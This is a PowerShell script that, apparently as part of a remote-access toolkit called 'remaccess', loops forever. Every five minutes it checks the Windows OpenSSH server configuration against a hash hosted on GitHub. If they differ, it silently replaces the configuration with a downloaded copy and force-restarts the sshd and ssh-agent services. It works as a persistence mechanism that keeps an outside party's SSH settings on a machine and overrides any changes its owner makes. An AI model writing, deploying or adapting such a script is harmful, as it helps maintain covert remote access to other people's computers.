$sshDataDirectory = "C:\ProgramData\ssh"
$sshdConfigPath = Join-Path $sshDataDirectory "sshd_config"
$sshdServiceName = "sshd"
$sshAgentServiceName = "ssh-agent"
$hashUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/HashesOfCorePrograms.txt"
$downloadUrl = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/OpenSSHStuff/sshd_config"
while ($true) {
    if (Test-Path $sshDataDirectory) {
        $programNameWithExtension = [System.IO.Path]::GetFileName($downloadUrl)
        $retryCount = 0
        $maxRetries = 3
        while ($retryCount -lt $maxRetries) {
            if (Test-Path $sshdConfigPath) {
                $existingFileHash = (Get-FileHash -Path $sshdConfigPath -Algorithm SHA256).Hash
                $hashesData = (iwr -Uri $hashUrl -UseBasicParsing).Content
                $hashRegex = "$programNameWithExtension ([A-Fa-f0-9]+)"

                if ($hashesData -match $hashRegex) {
                    $programHash = $matches[1]
                }
                if ($programHash -eq $existingFileHash) {
                    break
                } else {
                    Remove-Item -Path $sshdConfigPath -Force
                    $retryCount++
                }
            } else {
                $retryCount++
            }
            if ($retryCount -lt $maxRetries) {
                Invoke-WebRequest -Uri $downloadUrl -OutFile $sshdConfigPath
            }
        }
        Restart-Service -Name $sshdServiceName -Force -ErrorAction SilentlyContinue
        Restart-Service -Name $sshAgentServiceName -Force -ErrorAction SilentlyContinue
    }
    Start-Sleep -Seconds 300
}
